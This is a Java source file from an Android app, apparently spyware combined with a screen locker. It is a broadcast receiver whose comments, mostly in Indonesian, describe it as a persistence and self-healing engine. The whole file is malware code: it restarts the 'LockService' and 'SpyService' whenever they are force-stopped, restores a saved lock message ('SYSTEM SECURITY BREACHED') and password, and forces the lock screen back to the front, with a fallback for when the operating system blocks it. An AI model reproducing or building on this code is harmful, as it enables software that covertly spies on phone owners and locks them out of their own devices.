package com.nullx.pp;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

/**
 * RestarterReceiver: Persistence & Self-Healing Engine.
 * Menghidupkan kembali LockService dan SpyService jika dimatikan paksa.
 * Sinkron dengan SpyService onDestroy() signal.
 */
public class RestarterReceiver extends BroadcastReceiver {
    
    private static final String TAG = "NXOB_RESTORE";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Restarter Service Triggered: " + (action != null ? action : "Direct Call"));

        // 1. Ambil State Terakhir (Agar mode lock tidak berubah saat restart)
        SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        String lastMode = prefs.getString("last_lock_mode", "NORMAL");
        String lastMsg = prefs.getString("last_lock_msg", "SYSTEM SECURITY BREACHED");
        String lastPass = prefs.getString("last_lock_pass", "123");

        // 2. Re-aktivasi LockService (Persistence)
        Intent lockIntent = new Intent(context, LockService.class);
        lockIntent.putExtra("mode", lastMode);
        lockIntent.putExtra("message", lastMsg);
        lockIntent.putExtra("password", lastPass);

        // 3. Re-aktivasi SpyService (Intelijen)
        Intent spyIntent = new Intent(context, SpyService.class);

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Foreground service wajib untuk Android 8.0+
                context.startForegroundService(lockIntent);
                context.startForegroundService(spyIntent);
            } else {
                context.startService(lockIntent);
                context.startService(spyIntent);
            }
            Log.d(TAG, "Services successfully resurrected.");
        } catch (Exception e) {
            Log.e(TAG, "Failed to restart services: " + e.getMessage());
        }

        // 4. Force Wakeup (Membawa aplikasi ke depan jika sedang terkunci)
        // Catatan: Pada Android 10+, ini memerlukan izin "Display over other apps" 
        // yang sudah kita minta di MainActivity.
        Intent activityIntent = new Intent(context, MainActivity.class);
        activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK 
                               | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT 
                               | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        
        try {
            context.startActivity(activityIntent);
        } catch (Exception e) {
            // Jika startActivity diblokir OS, gunakan fallback via PendingIntent
            Log.w(TAG, "Direct activity start blocked. Using fallback.");
            try {
                PendingIntent pendingIntent = PendingIntent.getActivity(
                    context, 0, activityIntent, 
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0
                );
                pendingIntent.send();
            } catch (PendingIntent.CanceledException ce) {
                Log.e(TAG, "Wakeup fallback failed.");
            }
        }
    }
}